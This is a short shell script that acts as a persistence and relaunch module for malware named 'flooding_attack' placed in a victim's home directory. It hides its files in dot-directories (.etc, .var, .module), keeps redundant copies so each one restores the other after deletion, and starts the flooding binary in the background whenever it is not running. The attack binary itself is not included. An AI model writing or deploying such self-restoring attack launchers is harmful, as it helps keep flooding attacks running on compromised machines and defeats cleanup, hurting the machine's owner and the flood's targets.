#!/bin/sh

home_dir="/home/victim"
launch_dir=".launch_attack"
dir01=".etc"
dir02=".var"
module_dir=".module"
launch_file="launching_attack.sh"
flooding_file="flooding_attack"

check_and_restore() {
  if [ ! -d "$home_dir/$dir01" ] ||\
    [ ! -d "$home_dir/$dir01/$module_dir" ] ||\
    [ ! -f "$home_dir/$dir01/$module_dir/$launch_file" ] ||\
    [ ! -f "$home_dir/$dir01/$module_dir/$flooding_file" ]
  then
    cp -r "$home_dir/$dir02" "$home_dir/$dir01"
  fi
  if [ ! -d "$home_dir/$dir02" ] ||\
    [ ! -d "$home_dir/$dir02/$module_dir" ] ||\
    [ ! -f "$home_dir/$dir02/$module_dir/$launch_file" ] ||\
    [ ! -f "$home_dir/$dir02/$module_dir/$flooding_file" ]
  then
    cp -r "$home_dir/$dir01" "$home_dir/$dir02"
  fi
}

is_process_exist() {
  local process_name="flooding_attack"
  ps -e | grep -q "$process_name"
}

payload() {
  is_process_exist
  if [ $? -eq 0 ]; then # positive match
    echo "Attack already launched!"
  else
    $home_dir/$dir01/$module_dir/flooding_attack&
  fi
}

main() {
  check_and_restore
  payload
}
main
